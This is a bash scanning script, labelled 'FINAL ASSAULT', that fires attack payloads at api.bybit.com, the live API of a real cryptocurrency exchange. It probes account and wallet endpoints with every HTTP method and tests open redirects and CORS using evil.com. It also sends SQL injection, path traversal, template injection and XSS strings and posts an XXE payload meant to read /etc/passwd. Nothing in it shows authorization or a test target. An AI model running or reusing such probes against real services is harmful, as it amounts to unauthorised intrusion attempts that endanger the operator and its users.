#!/bin/bash
# FINAL ASSAULT - Testing everything we can

echo "=========================================="
echo "FINAL ASSAULT - COMPREHENSIVE TESTING"
echo "=========================================="

BASE="https://api.bybit.com"

# Test ALL v5 endpoints with different methods
echo -e "\n[1] Testing V5 Endpoints with Different HTTP Methods"
for endpoint in "/v5/user/query-api" "/v5/account/wallet-balance" "/v5/order/history"; do
    echo -e "\n$endpoint:"
    for method in GET POST PUT DELETE PATCH OPTIONS; do
        response=$(curl -s -X $method -w "\nHTTP_CODE:%{http_code}" "$BASE$endpoint" 2>&1 | tail -1)
        code=$(echo "$response" | grep -o "[0-9]*$")
        if [ "$code" != "404" ] && [ "$code" != "403" ] && [ "$code" != "401" ]; then
            echo "  $method: $code ⚠️"
        fi
    done
done

# Test for SSRF via redirect
echo -e "\n\n[2] Testing for Open Redirect"
redirects=(
    "?redirect=https://evil.com"
    "?url=https://evil.com"
    "?return_url=https://evil.com"
    "?next=https://evil.com"
    "?callback=https://evil.com"
)

for redirect in "${redirects[@]}"; do
    response=$(curl -s -I "$BASE/v5/user/login$redirect" 2>&1 | grep "Location:")
    if echo "$response" | grep -q "evil.com"; then
        echo "🚨 OPEN REDIRECT FOUND: $redirect"
        echo "$response"
    fi
done

# Test for information disclosure in error messages
echo -e "\n\n[3] Testing Error Message Disclosure"
payloads=(
    "'OR'1'='1"
    "../../../etc/passwd"
    "\${7*7}"
    "<script>alert(1)</script>"
)

for payload in "${payloads[@]}"; do
    response=$(curl -s "$BASE/v5/market/tickers?symbol=$payload" 2>&1)
    
    # Check for sensitive info in error
    if echo "$response" | grep -qiE "stack|trace|exception|debug|root|admin|password|secret"; then
        echo "⚠️  Sensitive info in error for payload: $payload"
        echo "$response" | head -3
    fi
done

# Test rate limiting
echo -e "\n\n[4] Testing Rate Limiting"
echo "Sending 10 rapid requests..."
count=0
for i in {1..10}; do
    response=$(curl -s -w "%{http_code}" -o /dev/null "$BASE/v5/market/time")
    if [ "$response" == "200" ]; then
        ((count++))
    fi
    sleep 0.1
done
echo "Success rate: $count/10"
if [ $count -ge 9 ]; then
    echo "⚠️  Weak rate limiting detected!"
fi

# Test for XXE
echo -e "\n\n[5] Testing XML External Entity (XXE)"
xxe_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
response=$(curl -s -X POST "$BASE/v5/user/update" \
    -H "Content-Type: application/xml" \
    -d "$xxe_payload" 2>&1)

if echo "$response" | grep -q "root:"; then
    echo "🚨🚨🚨 XXE VULNERABILITY FOUND!"
    echo "$response"
fi

# Test for CORS misconfiguration with credentials
echo -e "\n\n[6] Testing CORS with Credentials"
response=$(curl -s -H "Origin: https://evil.com" -v "$BASE/v5/market/time" 2>&1 | grep -i "access-control")
echo "$response"

if echo "$response" | grep -q "evil.com"; then
    echo "⚠️  CORS reflects origin"
    
    # Check credentials
    if echo "$response" | grep -qi "credentials.*true"; then
        echo "🚨 CORS allows credentials from arbitrary origin!"
    fi
fi

echo -e "\n=========================================="
echo "FINAL ASSAULT COMPLETE"
echo "=========================================="
